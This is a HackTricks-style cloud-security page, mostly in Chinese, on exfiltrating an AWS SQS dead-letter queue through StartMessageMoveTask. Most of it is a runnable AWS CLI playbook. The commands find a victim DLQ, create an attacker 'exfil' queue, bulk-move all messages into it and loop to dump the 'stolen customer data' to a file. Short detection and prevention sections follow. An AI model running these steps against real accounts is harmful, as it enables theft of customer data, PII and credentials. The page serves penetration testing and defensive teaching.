# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## 描述

滥用 SQS 消息移动任务，通过 `sqs:StartMessageMoveTask` 将受害者的 Dead-Letter Queue (DLQ) 中所有积累的消息重定向到攻击者控制的队列，从而窃取这些消息。该技术利用 AWS 的合法消息恢复功能来 exfiltrate 长期在 DLQ 中积累的敏感数据。

## 什么是 Dead-Letter Queue (DLQ)?

Dead-Letter Queue 是一种特殊的 SQS 队列，当主应用无法成功处理消息时，消息会被自动发送到该队列。那些处理失败的消息通常包含：
- 无法处理的敏感应用数据
- 错误详情和调试信息
- Personal Identifiable Information (PII)
- API tokens、凭证或其他秘密
- 关键业务交易数据

DLQ 相当于失败消息的“墓地”，因为它们会随着时间积累应用无法处理的敏感数据，因此是有价值的目标。

## 攻击场景

**真实案例：**
1. **电商应用** 通过 SQS 处理客户订单
2. **部分订单处理失败**（支付问题、库存问题等），被移动到 DLQ
3. **DLQ 积累** 了数周/数月的失败订单，包含客户数据： `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **攻击者获取** 了具有 SQS 权限的 AWS 凭证
5. **攻击者发现** DLQ 中包含数千条带敏感数据的失败订单
6. **攻击者没有逐条读取**（慢且容易被发现），而是使用 `StartMessageMoveTask` 将所有消息批量转移到自己的队列
7. **攻击者一次性提取** 所有历史敏感数据

## 要求
- 源队列必须被配置为 DLQ（至少被某个队列的 RedrivePolicy 引用）。
- IAM 权限（以被攻破的受害者主体身份运行）：
- 在 DLQ（源）上：`sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`。
- 在目标队列上：允许投递消息的权限（例如，队列策略允许来自受害者主体的 `sqs:SendMessage`）。对于同账号的目标队列，这通常默认允许。
- 如果启用了 SSE-KMS：在源 CMK 上需要 `kms:Decrypt`，在目标 CMK 上需要 `kms:GenerateDataKey`, `kms:Encrypt`。

## 影响
使用原生 SQS API 高速 exfiltrate 累积在 DLQ 中的敏感负载（失败事件、PII、令牌、应用负载）。如果目标队列策略允许来自受害者主体的 `SendMessage`，则可以跨账号使用。

## 如何滥用

- 确认受害者 DLQ 的 ARN，并确保它确实被某个队列作为 DLQ 引用（任何队列即可）。
- 创建或选择一个攻击者控制的目标队列，并获取其 ARN。
- 从受害者 DLQ 启动一个消息移动任务，将消息移动到你的目标队列。
- 监控进度，必要时取消任务。

### CLI 示例：Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: 攻击者已攻破 AWS 凭证，发现某电商应用使用 SQS 且其 DLQ 中包含失败的客户订单处理记录。

1) **发现并检查受害者的 DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **创建攻击者控制的目标队列**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **执行 bulk message theft**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **收集被窃取的敏感数据**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### 跨账户注意事项
- 目标队列必须有一个资源策略，允许受害方主体执行 `sqs:SendMessage`（如果使用，还需 KMS 授权/权限）。

## 为什么此攻击有效

1. **合法的 AWS 功能**：使用内置的 AWS 功能，使其难以被识别为恶意
2. **批量操作**：快速传输数千条消息，而不是缓慢地逐条访问
3. **历史数据**：DLQs 会在数周/数月内积累敏感数据
4. **不易被注意**：许多组织不会密切监视 DLQ 的访问
5. **支持跨账户**：如果权限允许，可将数据外传到攻击者自己的 AWS 账户

## 检测与防护

### 检测
监控 CloudTrail 中可疑的 `StartMessageMoveTask` API 调用：
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### 预防
1. **最小权限**：将 `sqs:StartMessageMoveTask` 权限限制为仅必要的角色
2. **监控 DLQs**：为异常的 DLQ 活动设置 CloudWatch 告警
3. **跨账号策略**：仔细审查允许跨账号访问的 SQS 队列策略
4. **加密 DLQs**：使用 SSE-KMS 并限制密钥策略
5. **定期清理**：不要让敏感数据在 DLQs 中无限期累积

{{#include ../../../banners/hacktricks-training.md}}
